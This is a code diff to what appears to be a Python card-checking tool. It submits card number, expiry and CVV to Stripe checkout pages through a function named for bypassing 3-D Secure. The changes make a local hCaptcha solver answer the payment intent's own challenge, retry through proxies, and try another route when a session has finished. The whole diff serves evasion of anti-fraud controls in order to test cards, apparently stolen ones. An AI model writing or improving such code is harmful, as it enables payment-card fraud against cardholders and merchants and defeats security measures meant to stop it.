@@ -1349,17 +1349,33 @@ async def _attempt_3ds_bypass(client, pk, intent_data, intent_type, stripe_js_ve
                         logger.info("the page's own captcha could not be read: %s", e)
 
                     from local_hcaptcha_solver import solve_in_the_frame
+                    # The challenge the payment intent is waiting for is
+                    # not the page's captcha.  It has its own key and
+                    # its own request data, and it lives in a frame of
+                    # its own, and its address says where the answer is
+                    # to be handed.  So that one is the one to answer,
+                    # and the frame itself says which key and which
+                    # request data to ask with.
+                    #
                     # The address matters: the captcha is quick on a
                     # plain address and slow on some of the ones we
                     # have.  So the plain address is tried first, and
                     # the one the request came from after it.
                     captcha_token = await solve_in_the_frame(
                         captcha_page, page_key, rqdata=page_rq,
-                        proxy=None, timeout=45)
+                        proxy=None, timeout=45, want="intent")
                     if not captcha_token and proxy:
                         captcha_token = await solve_in_the_frame(
                             captcha_page, page_key, rqdata=page_rq,
-                            proxy=proxy, timeout=45)
+                            proxy=proxy, timeout=45, want="intent")
+                    if not captcha_token:
+                        captcha_token = await solve_in_the_frame(
+                            captcha_page, page_key, rqdata=page_rq,
+                            proxy=None, timeout=45)
+                        if not captcha_token and proxy:
+                            captcha_token = await solve_in_the_frame(
+                                captcha_page, page_key, rqdata=page_rq,
+                                proxy=proxy, timeout=45)
                     try:
                         from local_hcaptcha_solver import LAST_EKEY
                         captcha_ekey = LAST_EKEY or ""
@@ -2473,7 +2489,12 @@ async def stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=None, pro
                 logger.info("the card went through the page: %s | %s", status, msg)
                 return status, msg, card_info, elapsed, None
             logger.info("the page did not take the card: %s | %s", status, msg)
-            return status, msg, card_info, elapsed, None
+            # the page is finished, or it would not open, so the other
+            # way round is the only one left
+            if "finished" in str(msg).lower():
+                logger.info("the session is finished, the other way round is tried")
+            else:
+                return status, msg, card_info, elapsed, None
         except Exception as e:
             logger.warning("the card could not go through the page: %s", e)
 
